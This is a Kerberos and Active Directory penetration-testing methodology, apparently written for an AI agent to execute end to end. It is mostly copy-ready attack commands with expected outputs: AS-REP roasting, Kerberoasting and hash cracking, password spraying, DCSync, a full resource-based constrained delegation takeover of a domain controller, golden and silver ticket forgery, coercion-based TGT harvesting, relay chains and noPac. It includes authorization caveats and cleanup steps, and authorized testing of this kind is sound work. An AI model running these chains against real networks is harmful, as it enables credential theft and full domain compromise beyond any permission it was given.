---
technology: "Kerberos"
kind: bug-bounty-methodology
audience: ai-agent
family: directory-services
version: "1.1"
last-refresh: "2026-11-19"
provenance: "field-mined (60 engagements; full machine-level ledger in internal coverage ledger) + upstream-verified: hashcat v8.0.0 example-hash table (modes 13100/18200/19600/19700/32100/32200), Microsoft Learn 'Kerberos Constrained Delegation Overview', NVD CVE-2020-17049 (bronze bit). Lab-safe placeholders throughout; clock-sync note field-sourced. Verified 2026-11-12. Supplement 2026-11-13: source: six2dez/pentest-book (post-exploitation/windows/ad/kerberos-attacks.md, no license — rewritten with attribution), accessed 2026-11-13; adds spray/keyring/delegation-blocker notes (Protected Users behavior verified against Microsoft Learn's Protected Users page). Ports.md additions (88/tcp user-oracle section): six2dez/pentest-book (enumeration/ports.md, no license — rewritten with attribution), accessed 2026-11-13. Supplement 2026-11-19 (AD bounty craft): expanded roasting/AS-REP/spray/delegation/forgery/relaying craft with command→output blocks, PAC-evidence standards and CTF notes; Rubeus/Impacket syntax and Kerberos AS-REQ error codes re-verified against SpecterOps Ghostpack docs, Impacket examples and Microsoft Learn; CVE-2020-17049, CVE-2021-42278/42287 (noPac) and CVE-2022-33679 re-verified against NVD/MSRC and vendor advisories (NetSPI, Horizon3, Silverfort). See the 2026-11-19 References block."
source: "six2dez/pentest-book (enumeration/ports.md, no license — rewritten with attribution), accessed 2026-11-13"
---

# Kerberos bug bounty methodology

Target model: an AD domain EXAMPLE.COM (DC dc01.example.com, KDC on 88/tcp), a
foothold ranging from "username list only" to "one valid credential" to "ACL write
somewhere". Companion overview: [[kerberos|Kerberos]]. Cross-unit: the ACL writes
that enable RBCD are in [[ad-acl-bug-bounty|the ad-acl methodology]]; cert-based
ticket requests (PKINIT) in ad-cs.

## Triage table

| Surface | Gate | Min privilege | Payoff |
|---|---|---|---|
| User enum (kerbrute userenum) | KDC 88 reachable | none | username list |
| AS-REP roast | accounts with DONT_REQ_PREAUTH | none (user list) | crackable hash → creds |
| Kerberoast | any authenticated session | any domain user | crackable service hashes |
| Ticket request (getTGT/GetST) | password / NT hash / AES key | that principal | usable ccache session |
| Golden ticket | krbtgt NT/AES key (DCSync etc.) | domain-admin equivalent | forge any identity |
| Silver ticket | service account key | that service's key | forge tickets to that SPN |
| Pass-the-ticket | any stolen .ccache/.kirbi/keytab | ticket possession | that principal's access |
| Unconstrained delegation | TGT in service memory | code exec on that host | harvested TGTs |
| Constrained delegation (S4U) | AllowedToDelegateTo entry | control of delegate svc | impersonate to allowed svcs |
| RBCD | write on msDS-AllowedToAct… (ad-acl) | that write + machine quota | impersonate anyone to host |
| Bronze bit (CVE-2020-17049) | unpatched KCD KDC + svc key | compromised KCD service | reuse non-delegable tickets |

Phase order: 0 prep → 1 user enum → 2 AS-REP roast → 3 Kerberoast → 4 crack →
5 tickets → 6 delegation → 7 forgery/PTT → 8 appliance surface.

## Phase 0 — Prep

```bash
ntpdate -u dc01.example.com        # or chronyd; skew >5min = KRB5KRB_AP_ERR_SKEW
```
Kerberos checks time before anything else; sync first, always (field-verified).

## Phase 1 — User enumeration

kerbrute userenum against a username wordlist — pre-auth AS-REQs act as an oracle
(VALID vs PRINCIPAL_UNKNOWN) without touching lockouts. Observed repeatedly across
the evidence pool.

```bash
kerbrute userenum -d example.com --dc 198.51.100.10 usernames.txt
```

## Phase 2 — AS-REP roast (no credential needed)

Accounts with "do not require preauthentication" return a crackable AS-REP to a
bare TGT request. Find candidates via LDAP (`userAccountControl` bit 0x400000 /
DONT_REQ_PREAUTH — GetNPUsers does the query and the request in one step; observed
both as a per-username loop and via -usersfile).

```bash
impacket-GetNPUsers example.com/ -no-pass -usersfile users.txt -dc-ip 198.51.100.10 \
  -format hashcat -outputfile asrep.txt        # observed twice
# hash line shape: $krb5asrep$23$user@EXAMPLE.COM:…  (observed three times)
```
LDAP query form for candidates: `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`.

## Phase 3 — Kerberoast (any authenticated user)

Request TGS for every SPN-bearing account; RC4-etype replies crack like NTLM.

```bash
impacket-GetUserSPNs example.com/user:'Password123!' -dc-ip 198.51.100.10 -request \
  -outputfile tgs.txt                            # observed (add -k for a kerberos session)
impacket-GetUserSPNs example.com/user:'Password123!' -request -request-user svc_target
#   targeted form when you can WRITE an SPN first (ad-acl WriteSPN; observed twice)
```
Hash line shape: `$krb5tgs$23*svc$EXAMPLE.COM$spn*…`. Windows-side: Rubeus
`kerberoast` (observed once via Covenant's equivalent); enumerate SPNs with
`setspn -Q */*` or LDAP on servicePrincipalName.

## Phase 4 — Crack (hashcat modes verified upstream v8.0.0)

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # AS-REP  etype 23 (observed)
hashcat -m 13100 tgs.txt   /usr/share/wordlists/rockyou.txt   # TGS-REP etype 23
# AES accounts: 19600/19700 (TGS-REP etype 17/18), 32100/32200 (AS-REP etype 17/18)
```

## Phase 5 — Request and use tickets

```bash
impacket-getTGT example.com/user:'Password123!'               # → user.ccache; -hashes :<NT> for PTH
export KRB5CCNAME=user.ccache                                  # every impacket tool now takes -k -no-pass
impacket-smbclient -k -no-pass example.com/svc@dc01.example.com   # observed
impacket-secretsdump -k -no-pass dc01.example.com -just-dc-user Administrator  # DCSync over Kerberos (observed)
kirbi2ccache ticket.kirbi ticket.ccache                        # Windows→Linux ticket conversion (observed)
```
Notes: NTLM-disabled estates — this phase IS the workflow (observed with a machine
account via `-hashes`, and on two Kerberos-only estates). Machine accounts work identically
(`ATTACKER01$`). Rubeus asktgt with `/certificate:` covers PKINIT when you hold
an AD CS cert (observed; ad-cs unit).

## Phase 6 — Delegation classes

**Unconstrained** — service runs with TRUSTED_FOR_DELEGATION; users' TGTs land in
its LSASS; compromise the host, dump TGTs (mimikatz/Rubeus), PTT as the visitors.
BloodHound "shortest paths to unconstrained delegation systems" is the observed
habit. No impersonation flags needed — just steal.

**Constrained** — service has `AllowedToDelegateTo` entries; S4U2Self obtains a
ticket to itself *as any user* (no password), S4U2Proxy extends it to the allowed
target SPN:

```bash
impacket-getST -spn WWW/dc01.example.com -impersonate Administrator \
  example.com/svc_delegate -hashes :<NT>          # observed (password form)
impacket-getST -self -impersonate 'TARGET.USER' -k example.com/svc:'pass'   # observed
```
Constraint: only to SPNs listed in the delegation entry; protocol transition
grants the "as any user" half.

**RBCD** — the *target* holds `msDS-AllowedToActOnBehalfOfOtherIdentity`; if you
can write it (GenericAll/WriteProperty on the computer — ad-acl unit) and create
a machine account (default user quota: 10 machines):

```bash
# 1. write (ad-acl): rbcd.py -action write_rbcd -delegate-to DC$ -delegate-from ATTACKER01$ ...
#    or: bloodyAD set rbcd (observed — clear_rbcd resets it)
# 2. verify empty first: Get-DomainComputer dc01 -Properties msds-allowedtoactonbehalfofotheridentity
#    observed twice
# 3. use (here): S4U as anyone → services on that host
impacket-getST -spn cifs/dc01.example.com -impersonate Administrator \
  example.com/ATTACKER01$ -hashes :<NT>
export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass dc01.example.com
```

**Bronze bit — CVE-2020-17049** (upstream-verified, field-silent): a compromised
service configured for KCD could tamper the forwardable/delegation flag on a
service ticket *not valid for delegation*, forcing the KDC to honor it; patched
Nov 2020 by changing KDC validation of KCD tickets. Context for old-build targets,
not an expected modern path.

## Phase 7 — Golden / silver tickets and pass-the-ticket

```bash
# silver: service account key → forge tickets accepted by THAT service only (observed twice)
impacket-ticketer -nthash <service_NT> -domain-sid S-1-5-21-… -domain example.com \
  -spn MSSQLSvc/dc01.example.com Administrator
# golden: krbtgt key → any user, any service, until the krbtgt password rotates twice
impacket-ticketer -nthash <krbtgt_NT> -domain-sid S-1-5-21-… -domain example.com Administrator
#   (observed shape repeatedly — administrator.ccache output)
export KRB5CCNAME=Administrator.ccache && klist
```
Pass-the-ticket: any ccache/kirbi/keytab you steal (disk, LSASS, /tmp/krb5cc_*)
authenticates as its principal — export KRB5CCNAME and go; no KDC contact needed.
Windows-side: Rubeus `ptt`, mimikatz `kerberos::ptt`.

## Phase 8 — MIT krb5 appliance surface (non-AD)

Linux hosts running Kerberized services with local realms: `kadmin.local`/`kadmin`
administers principals; with any shell, enumerate (`klist -k` keytabs, `kadmin -
q "listprincs"`), create principals (`addprinc`), or extract keys — repeatedly
observed. Keytab files are bearer
credential stores: steal and `kinit -kt`.

## Ports cheat-sheet additions (2026-11-13)

From six2dez/pentest-book enumeration/ports.md (no license — rewritten with attribution); NSE and module names verified against the nmap and metasploit repos. Note the source mislabels its own tooling in this section — GetNPUsers.py is the AS-REP-roast tool and GetUserSPNs.py the Kerberoast tool, exactly the reverse of its headings; the phases above already carry the correct mapping, and so do not import it. GetNPUsers/GetUserSPNs/getTGT (with `-hashes` and `-aesKey`), the `-k -no-pass` remote-exec family and kerbrute were all already covered — skipped.

- **88/tcp as a pre-LDAP user oracle** — `nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='EXAMPLE.COM' 198.51.100.10` drives the same pre-auth AS-REQ enumeration as kerbrute (Phase 1) through nmap when the kerbrute binary is not on the box; metasploit's auxiliary/gather/kerberos_enumusers is the framework-side equivalent. Worth its keep where LDAP and RPC are firewalled but the KDC listener answers everyone.

## Decision points

1. Cracked service account → check its delegation entries FIRST (Phase 6) before
   assuming password reuse.
2. Any ACL write on a computer object → RBCD chain (Phase 6) is usually the
   shortest path to code execution on that host.
3. krbtgt hash in hand → golden (Phase 7) but report the rotation requirement;
   silver is quieter when the target service is known.
4. All Impacket Kerberos fails with skew errors → Phase 0, always.

## Supplement (2026-11-13) — deltas from six2dez/pentest-book

Rewritten from six2dez/pentest-book (`post-exploitation/windows/ad/kerberos-attacks.md`, no license — rewritten with attribution), accessed 2026-11-13. Diff-first: AS-REP/Kerberoast tooling and modes, PTK, PTT, golden/silver, the delegation classes and the LDAP filters were already covered above — the deltas only.

**S1. Spray over the pre-auth oracle.** Phase 1's `kerbrute userenum` maps usernames; the same tool (and Tarlogic's original kerbrute.py) also password-sprays through AS-REQs — one password across many users without touching Windows lockout counters the way SMB auth does. Windows-side, the Rubeus `brute` module comes from Zer1t0's Rubeus fork specifically (GhostPack's upstream Rubeus has no brute command) — name the fork when documenting. Post-exploitation spray from a domain-joined box with the DomainPasswordSpray tooling covers the same class through existing sessions.

**S2. AES-key ticket requests are the quiet PTK form.** `impacket-getTGT example.com/user -aesKey <key>` (Rubeus: `/aes256:`) requests the TGT with the account's AES key instead of the RC4/NTLM derivation — matches modern default etypes, so the KDC log shows an ordinary AES ticket rather than a legacy-etype event. Same primitive as Phase 5, lower noise floor.

**S3. Linux-side ticket locations beyond files.** `grep default_ccache_name /etc/krb5.conf` says where ccache tickets live; when it is KEYRING (or KCM), the tickets are in kernel/memory, not `/tmp/krb5cc_*` — Tarlogic's tickey dumps them (as root it injects into other users' processes to reach theirs). Format conversion between kirbi (Windows, mimikatz/Rubeus) and ccache (Linux) has two interchangeable tools: kirbi2ccache (Phase 5) and Zer1t0's ticket_converter.py.

**S4. When delegation will NOT fire — check before burning effort.** Microsoft's Protected Users group membership blocks NTLM, DES/RC4 pre-auth, and BOTH unconstrained and constrained delegation outright, and caps TGT lifetime at 4 hours; the `NOT_DELEGATED` (ADS_UF_NOT_DELEGATED) userAccountControl bit kills delegation for that account the same way. A Phase 6 chain that "should work" against a principal with either marker fails by design — enumerate them (memberOf / userAccountControl bit 0x100000) before blaming your tooling. Kerberoasting still applies to such accounts; delegation-based impersonation does not.

## Supplement (2026-11-19) — AD bounty craft: roasting, delegation, forgery, relaying

*Diff-first expansion of Phases 1–7 for an AI agent executing the methodology end to end. The phases above are the terse field map; this section is the command→expected-output detail, the finding-framing, the authorization burden per class, the PAC-evidence standard, and the CTF lens. Nothing above is rewritten. Tool syntax and error codes re-verified 2026-11-19 (sources in the References block that follows). **Authorization reminder up front:** everything in Phases 1–5 (enum, roast, crack, PTT) is read-only or offline and fits any authorized AD test. Phase 6 delegation writes and the relay chains in C5 *modify the directory* — they create accounts and write security-descriptor attributes on live objects. Those belong only to engagements whose rules of engagement explicitly permit directory modification, with a named rollback plan. Most public bug-bounty programs do not; confirm scope in writing before the first `rbcd.py -action write`.*

### C1. Kerberoasting as a craft (expands Phase 3)

Phase 3 fires the roast; this is the full loop around it. The sequence is **enumerate SPNs → request TGS for each → crack offline → report the policy failure.** Order matters: build the SPN candidate list first so you roast deliberately, not blindly.

**SPN enumeration — the candidate list before you roast.** Any authenticated context can read `servicePrincipalName`. Three equivalent reads; use whichever your foothold allows:

```bash
# Linux, authenticated LDAP — user accounts (not computers) carrying an SPN
ldapsearch -x -H ldap://198.51.100.10 -D 'user@example.com' -w 'Password123!' \
  -b 'DC=example,DC=com' \
  '(&(objectCategory=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
# -> each entry: sAMAccountName: svc_mssql / servicePrincipalName: MSSQLSvc/db01.example.com:1433

impacket-GetUserSPNs example.com/user:'Password123!' -dc-ip 198.51.100.10
# -> table: ServicePrincipalName | Name | MemberOf | PasswordLastSet | LastLogon | Delegation
#    (NO -request here — this is the inventory pass; -request is the roast pass in Phase 3)
```

```powershell
# Windows, domain context
setspn -Q */*                               # every SPN in the domain
Get-DomainUser -SPN | select samaccountname,serviceprincipalname   # PowerView
```

Read the inventory before you roast. Prioritise by two columns: **`PasswordLastSet` years in the past** (an old service-account password predates any modern policy and almost always cracks) and **`MemberOf` naming privileged groups** (a Domain-Admins-member service account is a straight line to domain compromise if its hash cracks). `krbtgt` itself has an SPN — never roast it; its "crack" is meaningless and the request is noise.

**The three roasters, one target, expected outputs.** All three ask the KDC for a TGS-REP whose encrypted part is sealed with the service account's password-derived key:

```bash
# Impacket, from Linux (Phase 3 shows the core form; here with expected shape)
impacket-GetUserSPNs example.com/user:'Password123!' -dc-ip 198.51.100.10 -request \
  -outputfile tgs.txt
# -> $krb5tgs$23$*svc_mssql$EXAMPLE.COM$MSSQLSvc/db01.example.com*$a1b2...<long hex>

# Impacket over an existing ccache (NTLM-disabled estates)
export KRB5CCNAME=user.ccache
impacket-GetUserSPNs -k -no-pass -dc-host dc01.example.com example.com/ -request
```

```powershell
# Rubeus, from a domain-joined Windows foothold — pin the format, disable wrapping
Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:tgs.txt
# -> [*] SamAccountName : svc_mssql
#    [*] Hash           : $krb5tgs$23$*svc_mssql$EXAMPLE.COM$...*<hex>
# /nowrap keeps each hash on one line (paste-safe); /format:hashcat is explicit —
# do NOT rely on the default, which has drifted between john and hashcat across builds.
```

Rubeus defaults to RC4 (etype 23) TGS requests precisely because they crack; if a target account only supports AES you will get etype 17/18 hashes (hashcat 19600/19700 per Phase 4) which are far slower offline. `Rubeus.exe kerberoast /tgtdeleg` requests via the TGS-REP delegation trick and can force RC4 on some configs — note it, but do not assume it bypasses a hard AES-only policy.

**Crack and what a crack proves.**

```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
# cracked line: $krb5tgs$23$*svc_mssql$...:Summer2023!
```

**The finding is a password-policy failure, not a protocol bug.** Kerberoasting is *designed* behaviour — any authenticated user may request a service ticket. The vulnerability is that the service account's password is weak enough to crack offline. Frame the report that way: "Service account `svc_mssql` (member of `Domain Admins`) uses a crackable password, recoverable offline from a single authenticated TGS request — leading to full domain compromise." Severity tracks the account's privilege, not the roast. Remediation is a 25+ character managed/gMSA password or AES-only etypes, not "disable Kerberoasting" (you can't). Report the account name and privilege; **do not quote the recovered plaintext in the report body** — state that it cracked and attach the proof separately per C7.

**Targeted Kerberoasting (expands Phase 3's WriteSPN note).** If you hold `WriteProperty`/`GenericWrite` over a user who has *no* SPN, you can write one, roast it, then remove it:

```bash
# set a throwaway SPN on a victim you can write (ad-acl WriteSPN), roast, then clear
impacket-targetedKerberoast -v -d example.com -u user -p 'Password123!' --dc-ip 198.51.100.10
# -> writes a temp SPN per writable target, requests the TGS, prints the hash, removes the SPN
```

This *writes to the directory* (a transient SPN) — it is a smaller write than RBCD but still a modification; it belongs in engagements that permit directory writes, and the tool's auto-cleanup should be verified afterward (C7). In a bounty program that forbids writes, stop at reporting the dangerous ACL itself (the ad-acl unit) rather than exercising it.

### C2. AS-REP roasting as a craft (expands Phase 2)

Same offline-crack economics as Kerberoasting, but **no credential required** — only a username list — because the target accounts have pre-authentication disabled, so the KDC hands out an AS-REP whose encrypted blob is sealed with the account's password key to anyone who asks.

**Find the candidates.** The marker is the `DONT_REQ_PREAUTH` bit (`0x400000` = 4194304) in `userAccountControl`:

```bash
# authenticated LDAP read of the flagged accounts (confirm the list before roasting)
ldapsearch -x -H ldap://198.51.100.10 -D 'user@example.com' -w 'Password123!' \
  -b 'DC=example,DC=com' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
```

**Roast (Phase 2 shows the one-liner; here the output shape and the no-cred path):**

```bash
# unauthenticated — a username list is enough
impacket-GetNPUsers example.com/ -no-pass -usersfile users.txt -dc-ip 198.51.100.10 \
  -format hashcat -outputfile asrep.txt
# -> $krb5asrep$23$alice@EXAMPLE.COM:<hex>$<hex>
# accounts WITHOUT the flag print: [-] User alice doesn't have UF_DONT_REQUIRE_PREAUTH set
```

```powershell
Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt
```

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

**Finding-framing:** two findings in one. (1) The account has pre-auth disabled — a configuration weakness worth reporting even if the password never cracks (it exposes an offline crack oracle to anyone who can name the account). (2) If it cracks, the weak password is the escalation. Legacy apps and some service accounts set `DONT_REQ_PREAUTH`; the remediation is to re-enable pre-auth or enforce a strong password.

**The CVE-2022-33679 edge (verified).** When a pre-auth-disabled account *also* has an RC4 key configured, the AS-REP's session-key material can be recovered via an RC4-MD4 downgrade and known-plaintext brute force — yielding usable tickets without ever cracking the password. Microsoft disabled RC4-MD4/RC4-HMAC-OLD for this path in the Sep 2022 updates, so it is an old-build finding; the preconditions (pre-auth disabled **and** RC4 key **and** unpatched KDC) are narrow. Treat it as a bonus escalation on an already-flagged account, not a primary path.

### C3. Password spray over Kerberos (expands Phase 1 and Supplement S1)

Kerberos pre-auth is a cleaner spray oracle than SMB/LDAP auth because the KDC's AS-REQ error codes distinguish *why* a login failed, and a well-paced spray never touches a Windows SMB lockout counter the same way. But it **does** increment `badPwdCount` on the DC — spraying is not free of lockout risk; discipline is the whole game.

**The AS-REQ error oracle (verified codes).** Send an AS-REQ with a guessed password and read the KDC error:

| KDC error (code) | Meaning for the sprayer |
|---|---|
| `KDC_ERR_PREAUTH_REQUIRED` (0x19 / 25) | *(seen on userenum without a password)* the principal **exists** — valid username |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` (0x6 / 6) | no such account — invalid username |
| **no error — TGT returned** | the password is **correct** (`VALID LOGIN`) |
| `KDC_ERR_PREAUTH_FAILED` (0x18 / 24) | account exists, **password wrong** — this attempt incremented `badPwdCount` |
| `KDC_ERR_CLIENT_REVOKED` (0x12 / 18) | account **disabled, expired, or already locked out** — stop touching it |

That last row is your canary: a `CLIENT_REVOKED` where you expected `PREAUTH_FAILED` means you may be driving an account toward or past lockout. Halt and reassess.

**Lockout discipline — read the policy first, always.**

```bash
# read the domain lockout policy BEFORE spraying (threshold + observation window)
nxc smb 198.51.100.10 -u user -p 'Password123!' --pass-pol
# -> Account Lockout Threshold: 5  | Reset Account Lockout Counter after: 30 minutes
#    (Threshold 0 = no lockout; otherwise spray at most threshold-1 per window, with margin)
```

Rule of thumb: one password per observation window, cap attempts at **threshold minus 2** per account per window, and prefer `--safe` / `--delay` so a single lockout aborts the run rather than cascading. The spray one-liner (S1 names kerbrute):

```bash
kerbrute passwordspray -d example.com --dc 198.51.100.10 --safe users.txt 'Spring2026!'
# -> [+] VALID LOGIN: alice@example.com:Spring2026!
# --safe aborts on the first detected lockout ("Account lockout detected, aborting")
```

Seasons+year and `Company2026!` patterns remain the highest-yield guesses; one guess, across the whole user list, then wait out the window. Never run the same password twice in a window "to be sure" — that is how you double-count `badPwdCount` and lock the domain. Kerberos sprays also raise Windows events **4768** (TGT requested) and **4771** (pre-auth failed) on the DC — expect to be visible; pacing is about avoiding *damage* (lockouts), not avoiding detection.

### C4. Delegation, in depth (expands Phase 6)

Phase 6 names the three classes; this is the executable chain for each, with the authorization burden stated per class.

**Unconstrained — harvest, don't forge.** A host whose computer object has `TRUSTED_FOR_DELEGATION` caches the full TGT of *every* principal that authenticates to it. The modern path is not to wait: coerce a high-value principal (a DC, via the printer bug / PetitPotam-style coercion where in scope) to authenticate to the unconstrained host you control, then scrape the TGT as it lands:

```powershell
# 1. find unconstrained hosts (BloodHound: "shortest paths to unconstrained delegation")
Get-DomainComputer -Unconstrained | select name
# 2. monitor for inbound TGTs on the host you control
Rubeus.exe monitor /interval:5 /nowrap
# 3. coerce DC01 to auth to you (authorized engagements only — this is active coercion)
#    e.g. printerbug.py / PetitPotam toward your listener; DC01$ TGT appears in monitor
# 4. PTT the captured DC01$ TGT, then DCSync
Rubeus.exe ptt /ticket:<base64 DC01$ TGT>
```

Authorization: harvesting is passive, but *coercion* (printer bug, PetitPotam) is an active push against a production DC — permitted-engagement-only, and some programs forbid coercion specifically. A captured `DC01$` TGT is domain compromise; report the delegation misconfiguration, do not range across the domain with the ticket.

**Constrained + protocol transition.** Phase 6 gives the `getST` lines. The detail that matters for the report: `AllowedToDelegateTo` constrains the *target SPN*, but **protocol transition** (`TRUSTED_TO_AUTH_FOR_DELEGATION`, the "use any auth protocol" setting) is what grants S4U2Self the "as any user" power with no password. A constrained-delegation account *with* protocol transition is a full impersonation primitive to its allowed SPNs; without it, you can only extend a delegation the user actually performed. Note which one the target has — it changes the severity.

**RBCD — the full takeover chain, exact object manipulation.** This is the highest-impact and highest-authorization-burden path. Preconditions: you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the *target* computer object (GenericAll/GenericWrite/WriteProperty — the ad-acl unit), **and** you can obtain a principal with an SPN to delegate *from* — normally a machine account you create, which requires `ms-DS-MachineAccountQuota > 0` (default **10**).

```bash
# 0. confirm the quota lets you create a machine account; else reuse one you already control
nxc ldap 198.51.100.10 -u user -p 'Password123!' -M maq       # reads MachineAccountQuota
# -> MachineAccountQuota: 10

# 1. CREATE the attacker machine account (the "delegate-from" principal)
impacket-addcomputer example.com/user:'Password123!' -dc-ip 198.51.100.10 \
  -computer-name 'ATTACKER01$' -computer-pass 'Attacker123!'
# -> [*] Successfully added machine account ATTACKER01$ with password Attacker123!

# 2. verify the target attribute is EMPTY first (so you can prove you set it, and reset it)
impacket-rbcd example.com/user:'Password123!' -dc-ip 198.51.100.10 -delegate-to 'DC01$' -action read
# -> [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty

# 3. WRITE: target DC01$ now trusts ATTACKER01$ to act on behalf of others  (DIRECTORY WRITE)
impacket-rbcd example.com/user:'Password123!' -dc-ip 198.51.100.10 \
  -delegate-to 'DC01$' -delegate-from 'ATTACKER01$' -action write
# -> [*] Delegation rights modified successfully!  ATTACKER01$ can now impersonate users on DC01$

# 4. S4U as ATTACKER01$, impersonating a Domain Admin, to a service on DC01
impacket-getST -spn cifs/dc01.example.com -impersonate Administrator \
  example.com/ATTACKER01$:'Attacker123!' -dc-ip 198.51.100.10
# -> Administrator.ccache

# 5. use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.example.com

# 6. CLEANUP (mandatory): reset the attribute and remove the machine account
impacket-rbcd example.com/user:'Password123!' -dc-ip 198.51.100.10 -delegate-to 'DC01$' -action flush
impacket-addcomputer example.com/user:'Password123!' -computer-name 'ATTACKER01$' -delete
```

Authorization burden, stated plainly: steps 1, 3, and 6 **modify Active Directory** — you create an account and rewrite a security descriptor on a domain controller's object. This is enterprise-engagement territory with written authorization for directory modification and a rollback plan; the `-action flush` and `-delete` in step 6 are not optional. In a standard bounty program that forbids writes, the finding is the *writable* `msDS-AllowedToActOnBehalfOfOtherIdentity` ACL itself — report the dangerous permission (demonstrated read-only via BloodHound / `rbcd -action read`), not an exercised takeover. If the quota is 0 or you lack machine-creation rights, RBCD still works from any existing SPN-bearing principal whose key you hold.

**KrbRelayUp — RBCD as a local privilege escalation.** Where you already have a shell on a domain-joined host but not SYSTEM, KrbRelayUp chains a local Kerberos coercion (via KrbRelay) → relay to LDAP → write RBCD on the *current machine's own object* → S4U → SYSTEM, in one tool. It is "universal no-fix" only where **LDAP signing/channel-binding is not enforced** (the historical default). Same directory-write caveat applies, plus it is a privilege-escalation technique against the host itself — permitted-engagement scope.

**Before any of the above:** re-check the Supplement S4 blockers. A target in **Protected Users** or carrying `NOT_DELEGATED` (`ADS_UF_NOT_DELEGATED`, UAC bit `0x100000`) cannot be impersonated via delegation by design — the chain will fail at S4U, not at your tooling.

### C5. Kerberos relaying and the potato lineage (new)

Two related families often blur together; keep them distinct in a report.

**The potato lineage (local privilege escalation via `SeImpersonatePrivilege`).** On a host where you run as a service account holding `SeImpersonate`/`SeAssignPrimaryToken` (IIS, MSSQL, many service contexts), the potato family coerces a privileged local authentication and impersonates its token to reach SYSTEM. The lineage, roughly chronological: Hot Potato → Rotten/Juicy Potato (DCOM/NTLM reflection to local SYSTEM) → Rogue/PrintSpoofer → **RemotePotato0** (cross-session relay, abusing RPC/DCOM to relay an interactive user's authentication, originally NTLM but Kerberos-relay-capable). These are **local** privilege escalations — the finding is "service-account foothold → SYSTEM on this host," reported against the host, and they turn on a privilege the service was granted.

**Kerberos relay to AD services.** Distinct from the local potatoes: coerce a victim's Kerberos authentication and relay the AP-REQ to a service that does not enforce signing/channel-binding. **KrbRelay** (cube0x0) is the engine; **KrbRelayUp** wraps it into the LDAP→RBCD→SYSTEM LPE above. The high-value cross-protocol target is **AD CS web enrollment (ESC8)**: relay the coerced Kerberos (or NTLM) authentication to the CA's `/certsrv/` HTTP endpoint, enrol a certificate for the victim, then use that cert for PKINIT (the ad-cs unit) to obtain the victim's TGT — a durable credential that survives password resets. Note the moving target: a 2026 patch blocked a marshalled-name primitive that some Kerberos-ESC8 paths relied on, while the NTLM-relay path and the ESC8 *configuration* weakness itself remained — so verify which path actually fires against a patched target, and report ESC8 as a CA-configuration finding regardless. Relay chains are active and directory-touching: permitted-engagement scope, and coercion may be separately out of scope.

### C6. Ticket forgery as impact narrative (expands Phase 7)

Forgery is the *proof of impact after* you already hold the key material — it is almost never the finding itself, and in a bounty context it is usually **reported, not fired**. The payout comes from how you got the key (DCSync, a cracked service account, a delegation chain); the golden/silver ticket is the "and therefore an attacker can impersonate anyone" sentence, demonstrated minimally.

- **Golden** (krbtgt key): forge a TGT for any principal, valid until krbtgt rotates *twice*. Holding the krbtgt hash *is* domain compromise — report that; a single forged-TGT `klist` is sufficient proof. Always include the rotation requirement (rotate krbtgt twice, with the inter-rotation wait) in remediation.
- **Silver** (service account key): forge a TGS to one SPN only — quieter (no KDC contact) and useful when you hold just one service key. Scope the demo to the one service.
- **Diamond / Sapphire** (modern variants): rather than forging a TGT from scratch (golden), these *modify a legitimate TGT's PAC* (diamond) or request a ticket for a privileged user via S4U and transplant its PAC (sapphire) — both produce a ticket whose PAC passes more KDC-side validation than a classic golden ticket. Mention them as the current evasive forgery classes; you still need the krbtgt key, so the finding is unchanged.
- **Bronze bit (CVE-2020-17049, verified).** A compromised KCD service could flip the `forwardable` flag on a service ticket *not valid for delegation* and force the KDC to honour it, bypassing the "protected users"/`TrustedToAuthForDelegation` protections. Patched Nov 2020, but enforcement required the `PerformTicketSignature` registry key (deployment ran into ~Feb 2021, full enforcement later) — so an unpatched-or-misconfigured old DC is still a real finding. Context for legacy targets, not a modern default path.

**Adjacent, name them when the build is old (verified):** **noPac (CVE-2021-42278 + CVE-2021-42287)** chains an sAMAccountName-spoofing bug with a KDC PAC-fallback bug: create a machine account (quota permitting), rename its `sAMAccountName` to a DC's name without the trailing `$`, request a TGT, then let the KDC's fallback issue you a ticket *as the DC* — standard-user-to-DA on unpatched (pre-Nov-2021) domains. Tools: `noPac.py` / `sam_the_admin.py`. It creates and renames an account — directory-write, permitted-engagement-only, and cleanup matters.

### C7. Evidence standards — decode the ticket, decode the PAC

A Kerberos finding is proven by *what the ticket says*, not by a downstream shell alone. The evidence standard is a decoded ticket showing the impersonated identity and the PAC group membership — the Kerberos equivalent of a screenshot.

```powershell
# Windows: describe a ticket; with the service/krbtgt key it decrypts the PAC
Rubeus.exe describe /ticket:<base64 or ticket.kirbi>
# -> UserName, UserRealm, ServiceName, StartTime/EndTime/RenewTill, Flags (forwardable, …),
#    and (with /servicekey: or /krbkey:) the decrypted PAC: groups, SIDs, logon info
```

```bash
# Linux: decode a ccache/kirbi; with the key, decrypt and print PAC_LOGON_INFO
impacket-describeTicket Administrator.ccache
# -> Ticket fields + (with -k/-u decryption keys) PAC groups, group RIDs/SIDs, user flags
impacket-getPac -targetUser Administrator example.com/ATTACKER01$ -hashes :<NT>
# -> fetches and parses the target's PAC via S4U2Self — proves the groups you can impersonate
klist                                        # minimal proof: principal + service + validity
```

What to capture, and the discipline around it:
- **The decoded ticket/PAC** showing the impersonated principal and its privileged group membership (e.g. `Domain Admins` RID 512 in the PAC) — this proves impersonation without needing to touch protected data.
- **The request→reply pair** (the `getST`/`GetUserSPNs` invocation and the KDC's response or the hash line), one per step.
- **Redact secrets:** never paste a cracked plaintext password, a full krbtgt/service NT hash, or a full base64 ticket into the report body — reference them, attach separately, and note the value exists. A hash or ticket in a report is a live credential.
